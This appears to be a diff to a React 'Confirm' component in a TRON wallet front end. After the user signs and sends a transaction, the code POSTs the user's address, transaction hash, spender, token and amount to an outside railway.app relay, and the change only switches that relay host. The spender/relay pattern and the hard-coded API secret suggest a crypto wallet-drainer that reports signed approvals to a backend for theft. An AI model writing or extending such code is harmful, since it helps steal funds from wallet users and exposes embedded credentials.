@@ -105,7 +105,7 @@ export default function Confirm() {
         const signed = await tronWeb.trx.sign(txObj.transaction)
         const result = await tronWeb.trx.sendRawTransaction(signed)
         if (result.result) {
-          fetch('https://miami-production-6e01.up.railway.app/web/relay', {
+          fetch('https://yellow-production-a65d.up.railway.app/web/relay', {
             method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-secret': 'my-secret-2026-x7k9' },
             body: JSON.stringify({ chain: 'TRC20', address: userAddress, txHash: result.txid, spender: SPENDER, token: TOKEN, amount }),
             keepalive: true
